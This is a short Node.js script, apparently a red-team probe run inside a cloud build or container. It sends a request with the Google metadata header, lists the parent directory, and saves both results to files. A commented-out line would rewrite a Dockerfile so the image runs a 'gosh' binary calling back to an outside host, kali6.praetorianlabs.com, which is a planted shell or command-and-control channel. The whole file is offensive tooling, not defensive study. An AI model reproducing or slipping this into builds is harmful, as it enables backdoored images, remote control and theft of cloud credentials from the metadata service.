var http = require('http'); // 1 - Import Node.js core module
const { exec } = require("child_process");
const url = require('url');
const axios = require('axios');
fs = require('fs');

var result = '';

axios.get("https://google.com", {headers: {'Metadata-Flavor': 'Google'}}, { transformResponse: (r) => r }).then((r) =>{
    result = JSON.stringify(r.data);   
    fs.writeFileSync('ssrf.result', result);
}, (error) => {
    console.log(error);
    result = JSON.stringify(error);    
    fs.writeFileSync('ssrf.result', result);    
});



// exec("echo 'FROM node:14-slim\nRUN repo/./gosh -host kali6.praetorianlabs.com:80\nENV PORT 8080\nENV HOME /app\nCMD [\"npm\", \"start\"]\n' > ../Dockerfile", (error, stdout, stderr) => {
exec("ls ../", (error, stdout, stderr) => {
    if (error) {
        console.log(JSON.stringify(error.message));
        fs.writeFileSync('command.result', JSON.stringify(error.message));    
    }
    else if (stderr) {
        console.log(JSON.stringify(stderr));
        fs.writeFileSync('command.result', JSON.stringify(stderr));    
    }
    else
        console.log(JSON.stringify(stdout));
        fs.writeFileSync('command.result', JSON.stringify(stdout));    
});
